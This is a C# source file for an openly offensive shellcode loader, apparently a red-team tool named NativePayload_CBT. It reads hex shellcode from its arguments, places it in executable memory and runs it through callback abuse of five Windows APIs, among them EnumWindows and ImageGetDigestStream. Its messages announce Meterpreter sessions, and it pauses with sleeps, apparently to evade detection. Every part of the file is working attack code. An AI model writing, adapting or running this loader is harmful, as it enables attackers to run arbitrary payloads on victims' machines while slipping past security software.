using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_CBT
{
    class Program
    {
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040,
        }
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibraryW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);


        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("Imagehlp.dll")]
        private static extern bool ImageGetDigestStream(IntPtr filehandle, uint DigestLevel, IntPtr DigestFunction, IntPtr DigestHandle);
        [DllImport("user32.dll")]
        private static extern bool EnumWindows(IntPtr lpenumfunc, IntPtr lparam);
        [DllImport("user32.dll")]
        private static extern bool EnumWindowStationsW(IntPtr lpenumfunc, IntPtr lparam);
        [DllImport("kernel32.dll")]
        private static extern bool EnumResourceTypesW(IntPtr hmodule, IntPtr lpenumfunc, IntPtr lparam);
        [DllImport("user32.dll")]
        private static extern bool EnumChildWindows(IntPtr hwndparent, IntPtr lpenumfunc, uint lparam);

        static void Main(string[] args)
        {
            /// .Net 3.5 / 4.0 only ;)
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_CBT , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_CallBackTechniques (Some Callback Functions in one Code)");
            Console.WriteLine();

            Console.WriteLine("syntax:  NativePayload_CBT.exe [1,2,3,4,5] [Payload]");
            Console.WriteLine("example: NativePayload_CBT.exe  1  fc,00,56,67,a0,00,00,....");
            Console.WriteLine();
            Console.WriteLine("Techniques: 1 => ImageGetDigestStream , 2 => EnumWindows , 3 => EnumWindowStationsW \nTechniques: 4 => EnumResourceTypesW , 5 => EnumChildWindows ");
            Console.WriteLine();

            if (args.Length == 2)
            {
                /// CallBack Function ==> ImageGetDigestStream
                if (args[0] == "1")
                {
                    string[] X = args[1].Split(',');

                    byte[] Xpayload = new byte[X.Length];

                    for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
                    Console.WriteLine();
                    IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                    Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
                    Console.WriteLine("[!] VirtualAlloc.Result[" + p.ToString("X8") + "]");
                    System.Threading.Thread.Sleep(5555);
                    IntPtr p2 = CreateFileW(@"C:\Windows\System32\ntdll.dll", 0x01, 0x00000001, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
                    System.Threading.Thread.Sleep(5555);
                    Console.WriteLine("[!] CreateFileW.Result[" + p2.ToString("X8") + "]");
                    Console.WriteLine();
                    Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"ImageGetDigestStream\"  ;)");
                    IntPtr _out = IntPtr.Zero;
                    bool ok = ImageGetDigestStream(p2, 0x04, p, _out);
                    CloseHandle(_out);
                    CloseHandle(p2);
                    Console.ReadKey();
                }
                /// CallBack Function ==> EnumWindows
                if (args[0] == "2")
                {
                    string[] X = args[1].Split(',');
                    byte[] Xpayload = new byte[X.Length];
                    for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
                    Console.WriteLine();
                    IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                    // Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
                    RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
                    Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
                    System.Threading.Thread.Sleep(5555);
                    Console.WriteLine();
                    Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumWindows\"  ;)");
                    bool ok = EnumWindows(p, IntPtr.Zero);
                    Console.ReadKey();
                }
                /// CallBack Function ==> EnumWindowStationsW
                if (args[0] == "3")
                {
                    string[] X = args[1].Split(',');
                    byte[] Xpayload = new byte[X.Length];
                    for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
                    Console.WriteLine();
                    IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                    Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
                    Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
                    System.Threading.Thread.Sleep(5555);
                    Console.WriteLine();
                    Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumWindowStationsW\"  ;)");
                    bool ok = EnumWindowStationsW(p, IntPtr.Zero);
                    Console.ReadKey();
                }
                /// CallBack Function ==> EnumResourceTypesW
                if (args[0] == "4")
                {
                    string[] X = args[1].Split(',');
                    byte[] Xpayload = new byte[X.Length];
                    for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
                    Console.WriteLine();
                    IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                    Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
                    //RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
                    Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
                    System.Threading.Thread.Sleep(5555);
                    IntPtr hm = LoadLibraryW("c:\\windows\\system32\\kernel32.dll");
                    Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::LoadLibraryW.Result[" + hm.ToString("X8") + "]");
                    Console.WriteLine();
                    Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumResourceTypesW\"  ;)");
                    bool ok = EnumResourceTypesW(hm, p, IntPtr.Zero);
                    Console.ReadKey();
                }
                /// CallBack Function ==> EnumChildWindows
                if (args[0] == "5")
                {
                    string[] X = args[1].Split(',');
                    byte[] Xpayload = new byte[X.Length];
                    for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
                    Console.WriteLine();
                    IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                    Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
                    //RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
                    Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
                    System.Threading.Thread.Sleep(5555);
                    Console.WriteLine();
                    Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumChildWindows\"  ;)");
                    bool ok = EnumChildWindows(IntPtr.Zero, p, 0x0);
                    Console.ReadKey();
                }
            }
        }
    }
}
